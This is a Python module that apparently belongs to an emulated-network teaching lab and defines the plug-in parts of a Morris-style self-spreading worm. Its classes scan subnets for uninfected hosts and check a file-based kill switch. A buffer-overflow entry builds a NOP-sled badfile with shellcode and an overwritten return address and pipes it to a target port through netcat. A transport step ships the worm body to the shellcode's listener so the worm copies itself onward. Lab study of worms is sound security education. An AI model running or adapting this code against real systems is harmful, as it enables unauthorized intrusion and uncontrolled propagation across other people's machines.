#!/usr/bin/env python3
"""The worm's plugs. Every plug keeps one small promise;
the engine never knows which one it is holding.

Per seedemu Principle 4: no lab-specific defaults here —
the case configures every plug explicitly."""

import subprocess
import time


# ---------------- Slot 1: Scanner ----------------
class SubnetScanner:
    """Sweeps an explicit IP range, skipping hosts already infected."""
    def __init__(self, prefix, start, end):
        if not prefix or start is None or end is None:
            raise ValueError("SubnetScanner needs explicit prefix, start, end")
        self.candidates = [f"{prefix}{i}" for i in range(start, end + 1)]

    def next_target(self, infected):
        remaining = [ip for ip in self.candidates if ip not in infected]
        return remaining[0] if remaining else None


class TargetListScanner:
    """Knocks on an explicit list of targets (rehearsals, fixed plans)."""
    def __init__(self, targets):
        self.targets = list(targets)

    def next_target(self, infected):
        remaining = [t for t in self.targets if t not in infected]
        return remaining[0] if remaining else None


# ---------------- Slot 2: Governor ----------------
class KillSwitchGovernor:
    """Draft stand-in for the DNS kill switch: reads a local file.
    Missing file or 'run' -> keep spreading; 'stop' -> halt."""
    def __init__(self, switch_file):
        self.switch_file = switch_file

    def allowed(self):
        try:
            content = open(self.switch_file).read().strip()
        except FileNotFoundError:
            return True
        return "stop" not in content


# ---------------- Slot 3: Entry ----------------
class BufferOverflowEntry:
    """Morris-style entry: send a crafted badfile to a vulnerable
    stack server listening on the target's port.

    The addresses must match the victim's deterministic build
    (the vulnerable_server service guarantees this layout).
    """
    def __init__(self, port, ebp, buf, shellcode):
        self.port = port
        self.ebp = ebp
        self.buf = buf
        self.shellcode = shellcode

    def _create_badfile(self):
        content = bytearray(0x90 for _ in range(500))       # NOP sled
        content[500 - len(self.shellcode):] = self.shellcode
        ret = self.ebp + 40
        offset = self.ebp - self.buf + 4
        content[offset:offset + 4] = ret.to_bytes(4, byteorder="little")
        with open("badfile", "wb") as f:
            f.write(content)

    def break_in(self, target):
        print(f"  [entry]    sending badfile to {target}:{self.port} ...")
        self._create_badfile()
        result = subprocess.run(
            f"cat badfile | nc -w3 {target} {self.port}",
            shell=True, capture_output=True,
        )
        return result.returncode == 0


# ---------------- Slot 4: Payload ----------------
class NoopPayload:
    """Does nothing on arrival (for when the door itself sets off the bomb)."""
    def __init__(self):
        pass

    def run(self, target):
        print(f"  [payload]  (nothing to do on {target})")


# ---------------- Slot 5: Transport ----------------
class TriggerOnlyTransport:
    """Body is pre-staged by the service installer; nothing to ship."""
    def __init__(self):
        pass

    def deliver(self, target):
        print(f"  [transport] body already on {target}; nothing to ship")


class BodyTransport:
    """Morris-faithful: after the door breaks, ship the worm body
    to the shellcode's nc listener so the worm reproduces itself."""
    def __init__(self, port, body_file, delay=2.0):
        self.port = port
        self.body_file = body_file
        self.delay = delay

    def deliver(self, target):
        print(f"  [transport] shipping body to {target}:{self.port} ...")
        time.sleep(self.delay)   # give the shellcode's listener a moment to start
        result = subprocess.run(
            f"nc -w3 {target} {self.port} < {self.body_file}",
            shell=True, capture_output=True,
        )
        return result.returncode == 0
